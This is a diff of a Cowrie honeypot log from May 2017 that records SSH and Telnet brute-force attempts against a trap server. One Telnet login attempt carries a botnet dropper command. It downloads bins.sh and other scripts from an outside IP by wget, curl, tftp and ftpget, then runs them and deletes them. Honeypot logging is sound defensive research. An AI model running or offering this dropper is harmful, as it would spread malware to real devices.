@@ -147,3 +147,39 @@
 	reason: Bye Bye
 2017-05-09T23:55:58+0000 [HoneyPotSSHTransport,77449,130.206.99.99] connection lost
 2017-05-09T23:55:58+0000 [HoneyPotSSHTransport,77449,130.206.99.99] Connection lost after 5 seconds
+2017-05-09T23:56:24+0000 [CowrieTelnetTransport,54029,222.171.213.225] Closing TTY Log: log/tty/20170509-235439-None-54029i.log after 104 seconds
+2017-05-09T23:56:24+0000 [CowrieTelnetTransport,54029,222.171.213.225] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-09T23:56:24+0000 [CowrieTelnetTransport,54029,222.171.213.225] Connection lost after 109 seconds
+2017-05-09T23:56:34+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 130.206.99.99:51104 (10.8.41.81:2222) [session: 5b7e9430]
+2017-05-09T23:56:35+0000 [HoneyPotSSHTransport,77450,130.206.99.99] Remote SSH version: SSH-2.0-libssh-0.2
+2017-05-09T23:56:35+0000 [HoneyPotSSHTransport,77450,130.206.99.99] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
+2017-05-09T23:56:35+0000 [HoneyPotSSHTransport,77450,130.206.99.99] outgoing: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-09T23:56:35+0000 [HoneyPotSSHTransport,77450,130.206.99.99] incoming: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-09T23:56:35+0000 [HoneyPotSSHTransport,77450,130.206.99.99] NEW KEYS
+2017-05-09T23:56:35+0000 [HoneyPotSSHTransport,77450,130.206.99.99] starting service 'ssh-userauth'
+2017-05-09T23:56:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77450,130.206.99.99] 'clamav' trying auth 'password'
+2017-05-09T23:56:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77450,130.206.99.99] login attempt: 7974
+2017-05-09T23:56:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77450,130.206.99.99] login return, expect: [aa/123456]
+2017-05-09T23:56:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77450,130.206.99.99] login attempt [clamav/12] failed
+2017-05-09T23:56:39+0000 [-] 'clamav' failed auth 'password'
+2017-05-09T23:56:39+0000 [-] unauthorized login: 
+2017-05-09T23:56:39+0000 [HoneyPotSSHTransport,77450,130.206.99.99] Got remote error, code 11
+	reason: Bye Bye
+2017-05-09T23:56:39+0000 [HoneyPotSSHTransport,77450,130.206.99.99] connection lost
+2017-05-09T23:56:39+0000 [HoneyPotSSHTransport,77450,130.206.99.99] Connection lost after 4 seconds
+2017-05-09T23:56:43+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 82.118.242.174:34074 (10.8.41.81:2223) [session: TT54030]
+2017-05-09T23:56:44+0000 [CowrieTelnetTransport,54030,82.118.242.174] login attempt: 1071
+2017-05-09T23:56:44+0000 [CowrieTelnetTransport,54030,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-09T23:56:44+0000 [CowrieTelnetTransport,54030,82.118.242.174] login attempt [user/123456] failed
+2017-05-09T23:56:44+0000 [CowrieTelnetTransport,54030,82.118.242.174] Warning: state changed and new state returned
+2017-05-09T23:56:46+0000 [CowrieTelnetTransport,54030,82.118.242.174] login attempt: 1072
+2017-05-09T23:56:46+0000 [CowrieTelnetTransport,54030,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-09T23:56:46+0000 [CowrieTelnetTransport,54030,82.118.242.174] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/bins.sh; curl -O http://82.118.242.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 82.118.242.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 82.118.242.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 82.118.242.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-09T23:56:46+0000 [CowrieTelnetTransport,54030,82.118.242.174] Warning: state changed and new state returned
+2017-05-09T23:57:01+0000 [CowrieTelnetTransport,54030,82.118.242.174] Connection lost after 17 seconds
+2017-05-09T23:57:01+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 202.77.124.61:60666 (10.8.41.81:2222) [session: ffe7ac45]
+2017-05-09T23:57:01+0000 [HoneyPotSSHTransport,77451,202.77.124.61] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-05-09T23:57:01+0000 [HoneyPotSSHTransport,77451,202.77.124.61] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-09T23:57:01+0000 [HoneyPotSSHTransport,77451,202.77.124.61] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-09T23:57:01+0000 [HoneyPotSSHTransport,77451,202.77.124.61] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
